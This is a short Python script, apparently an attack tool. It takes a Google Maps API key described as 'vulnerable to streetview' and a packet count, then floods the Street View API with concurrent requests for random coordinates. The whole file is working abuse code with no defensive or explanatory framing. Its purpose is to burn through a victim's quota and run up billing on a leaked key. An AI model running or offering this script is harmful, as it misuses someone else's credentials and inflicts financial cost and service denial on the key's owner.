#!/usr/bin/python3
import grequests, warnings, json, sys, os, random, colorama
from colorama import Fore
colorama.init(autoreset=True)

def exception_handler(request, exception):
    print(Fore.RED + "Request Failed.")

def generate_url(apikey):
    lat_a = random.randrange(-89,90)
    lat_b = random.randrange(0,100000)
    lng_a = random.randrange(-89,90)
    lng_b = random.randrange(0,100000)
    return f"https://maps.googleapis.com/maps/api/streetview?size=400x400&location={lat_a}.{lat_b},{lng_a}.{lng_b}&fov=90&heading=235&pitch=10&key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to streetview: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    urls = list()
    for i in range(count):
        url = generate_url(apikey)
        urls.append(url)

    responses = (grequests.get(u, timeout=5) for u in urls)
    result_map = grequests.imap(responses, exception_handler=exception_handler, size=100)
    for result in result_map:
        if result is not None:
            if result.status_code == 200:
                print(Fore.GREEN + f"[+] Packet Succeed: {result.status_code}")
            else:
                print(Fore.RED + f"[-] Packet Failed: {result.status_code}")
        else:
            print("[-] Packet Failed: Request Failed")

if __name__ == "__main__":
    do_attack()

